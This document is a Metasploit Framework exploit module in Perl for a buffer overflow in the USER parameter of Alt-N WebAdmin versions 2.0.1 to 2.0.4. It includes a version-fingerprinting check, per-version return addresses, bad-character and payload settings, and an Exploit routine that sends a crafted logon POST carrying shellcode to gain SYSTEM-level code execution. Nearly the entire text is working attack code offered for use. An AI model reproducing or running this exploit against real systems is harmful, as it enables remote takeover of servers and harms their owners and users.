WebAdmin <= 2.0.4 USER Buffer Overflow Exploit
==============================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::altn_webadmin;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	&#039;Name&#039;  => &#039;Alt-N WebAdmin USER Buffer Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039; => [ &#039;y0 [at] w00t-shell.net&#039;, ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;win2000&#039;, &#039;winxp&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;  => 0,
	
	&#039;AutoOpts&#039;  => { &#039;EXITFUNC&#039; => &#039;thread&#039; },
	&#039;UserOpts&#039;  => {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 1000],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },
	  
	

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 830,
		&#039;BadChars&#039;  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
		&#039;Prepend&#039;   => "\x81\xc4\xff\xef\xff\xff\x44",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
Alt-N WebAdmin is prone to a buffer overflow condition. 
This is due to insufficient bounds checking on the USER 
parameter. Successful exploitation could result in code 
execution with SYSTEM level privileges.
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;BID&#039;, &#039;8024&#039;],
		[&#039;NSS&#039;, &#039;11771&#039;],
	  ],
	  
	&#039;Targets&#039; =>
	  [
		[&#039;WebAdmin 2.0.4 Universal&#039;, 0x10074d9b], # 2.0.4 webAdmin.dll
		[&#039;WebAdmin 2.0.3 Universal&#039;, 0x10074b13], # 2.0.3 webAdmin.dll
		[&#039;WebAdmin 2.0.2 Universal&#039;, 0x10071e3b], # 2.0.2 webAdmin.dll
		[&#039;WebAdmin 2.0.1 Universal&#039;, 0x100543c2], # 2.0.1 webAdmin.dll

	  ],
	&#039;Keys&#039; => [&#039;webadmin&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}

	$s->Send("GET / HTTP/1.0\r\n\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /v2\.0\.4|v2\.0\.3|v2\.0\.2|v2\.0\.1/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode(&#039;Safe&#039;);
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode(&#039;Detected&#039;);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $splat = Pex::Text::AlphaNumText(168);

	my $credz =
	  "User=". $splat. pack(&#039;V&#039;, $target->[1]). $shellcode.
	  "&Password=wtf&languageselect=en&Theme=Heavy&Logon=Sign+In\r\n";

	my $sploit =
	  "POST /WebAdmin.DLL?View=Logon HTTP/1.1\r\n".
	  "Content-Type: application/x-www-form-urlencoded\r\n".
	  "Connection: close\r\n".
	  "Cookie: User=y0; Lang=en; Theme=standard\r\n".
	  "User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.31-grsec i686)\r\n".
	  "Host: $target_host\r\n".
	  "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n".
	  "Accept-Language: en\r\n".
	  "Accept-Charset: iso-8859-1,*,utf-8\r\n".
	  "Content-Length: ". length($credz). "\r\n\r\n".
	  $credz;

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}


